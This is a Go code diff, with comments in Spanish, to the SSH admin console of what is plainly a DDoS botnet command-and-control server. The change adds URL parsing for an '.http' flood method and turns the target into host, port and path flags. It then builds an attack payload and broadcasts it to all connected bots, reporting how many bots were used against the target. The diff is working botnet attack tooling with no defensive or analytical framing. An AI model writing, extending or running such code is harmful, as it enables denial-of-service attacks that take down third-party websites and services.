@@ -8,6 +8,8 @@ import (
 	"strings"
 	"time"
 
+	"net/url"
+
 	"github.com/alexeyco/simpletable"
 )
 
@@ -1282,26 +1284,81 @@ func AdminSSH(conn net.Conn) {
 			continue
 
 		default:
-			attack, ok := IsMethod(strings.Split(strings.ToLower(command), " ")[0])
-			if !ok && attack == nil {
-				session.Conn.Write([]byte(fmt.Sprintf("%sUnknown command:%s %s%s%s\r\n", ansiError, ansiReset, ansiCommands, strings.Split(strings.ToLower(command), " ")[0], ansiReset)))
+
+			// Separar el comando en argumentos
+			args := strings.Fields(command)
+			if len(args) == 0 {
+				continue
+			}
+			methodName := strings.ToLower(args[0])
+
+			// Si el método es .http y hay suficientes argumentos, parsear URL
+			if methodName == ".http" && len(args) >= 3 {
+				u, err := url.Parse(args[1])
+				if err != nil || u.Host == "" {
+					session.Conn.Write([]byte(ansiError + "Invalid URL" + ansiReset + "\r\n"))
+					continue
+				}
+				host := u.Hostname()
+				if host == "" {
+					session.Conn.Write([]byte(ansiError + "Missing host in URL" + ansiReset + "\r\n"))
+					continue
+				}
+				port := u.Port()
+				if port == "" {
+					if u.Scheme == "https" {
+						port = "443"
+					} else {
+						port = "80"
+					}
+				}
+				path := u.RequestURI()
+				if path == "" {
+					path = "/"
+				}
+
+				// Construir nuevo slice de argumentos
+				newArgs := make([]string, 0, len(args)+3)
+				newArgs = append(newArgs, args[0]) // método
+				newArgs = append(newArgs, host)    // destino (hostname)
+				newArgs = append(newArgs, args[2]) // duración
+				if len(args) > 3 {
+					newArgs = append(newArgs, args[3:]...) // banderas originales
+				}
+				// Añadir banderas derivadas
+				newArgs = append(newArgs, "domain="+host)
+				newArgs = append(newArgs, "path="+path)
+				newArgs = append(newArgs, "dport="+port)
+
+				args = newArgs
+				methodName = strings.ToLower(args[0]) // actualizar método (sigue siendo .http)
+			}
+
+			// Validar que el método existe
+			attack, ok := IsMethod(methodName)
+			if !ok {
+				session.Conn.Write([]byte(fmt.Sprintf("%sUnknown command:%s %s%s%s\r\n", ansiError, ansiReset, ansiCommands, methodName, ansiReset)))
 				continue
 			}
 
-			// Builds the attack command into bytes
-			payload, err := attack.Parse(strings.Split(command, " "), account)
+			// Parsear el ataque con los argumentos transformados
+			payload, err := attack.Parse(args, account)
 			if err != nil {
-				session.Conn.Write([]byte(ansiError + fmt.Sprint(err) + ansiReset + "\r\n"))
+				session.Conn.Write([]byte(ansiError + err.Error() + ansiReset + "\r\n"))
 				continue
 			}
 
+			// Generar el slice de bytes a enviar a los bots
 			bytes, err := payload.Bytes()
 			if err != nil {
-				session.Conn.Write([]byte(ansiError + fmt.Sprint(err) + ansiReset + "\r\n"))
+				session.Conn.Write([]byte(ansiError + "Failed to build attack: " + err.Error() + ansiReset + "\r\n"))
 				continue
 			}
 
+			// Transmitir a todos los bots
 			BroadcastClients(bytes)
+
+			// Mostrar mensaje de éxito
 			parts := strings.Fields(command)
 			target := "unknown"
 			duration := "?"
@@ -1314,6 +1371,7 @@ func AdminSSH(conn net.Conn) {
 			bots := strconv.Itoa(len(Clients))
 			face := purpleGradientText("X_X")
 			session.Conn.Write([]byte(ansiSuccess + "Successfully" + ansiReset + " " + ansiCommands + "sent attack to " + target + " for " + duration + " with " + bots + " bots " + ansiReset + face + ansiReset + "\r\n"))
+
 		}
 	}
 }
